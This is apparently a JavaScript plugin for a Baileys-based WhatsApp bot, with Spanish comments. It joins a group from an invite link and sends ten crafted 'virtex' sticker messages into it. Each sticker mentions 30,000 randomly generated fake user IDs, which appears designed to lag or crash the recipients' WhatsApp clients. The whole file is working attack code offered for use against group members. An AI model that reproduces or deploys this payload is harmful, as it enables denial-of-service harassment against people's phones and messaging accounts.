const baileys = require('@whiskeysockets/baileys');
const proto = baileys.proto;
const generateWAMessageFromContent = baileys.generateWAMessageFromContent;

let handler = async (m, { conn, args, usedPrefix, command }) => {
  // Verifica si el usuario dio el link
  if (!args[0]) {
    return m.reply(`⚠️ Usa el comando así: *${usedPrefix + command} <link del grupo>*`);
  }

  // Extrae el código del grupo desde el link
  let groupLink = args[0];
  let code = groupLink.match(/chat\.whatsapp\.com\/([0-9A-Za-z]{20,24})/i)?.[1];

  if (!code) {
    return m.reply('❌ Link inválido. Asegúrate de usar un link de invitación válido.');
  }

  try {
    // El bot se une al grupo
    let isTarget = await conn.groupAcceptInvite(code);

    m.reply(`✅ Me uní correctamente al grupo. Enviando mensajes...`);

    // Enviar 10 mensajes al grupo
    for (let i = 0; i < 10; i++) {
      await DelayStc(conn, isTarget);
      await delay(1000); // espera 1 segundo entre cada mensaje (puedes quitarlo)
    }

    m.reply(`✅ Mensajes enviados exitosamente.`);

  } catch (e) {
    console.error(e);
    m.reply('❌ Error al unirse o enviar mensajes al grupo.');
  }
};

handler.command = /^togrup$/i;
handler.group = false;
handler.private = false;
handler.register = false;
handler.limit = false;

export default handler;

// Función para enviar sticker "virtex"
async function DelayStc(conn, jid) {
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: jid,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: { low: 3304, high: 0, unsigned: true },
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: { low: 1746262763, high: 0, unsigned: false },
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

  await conn.relayMessage(jid, stickerMsg.message, { messageId: stickerMsg.key.id });
}

// Pequeña función de espera
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}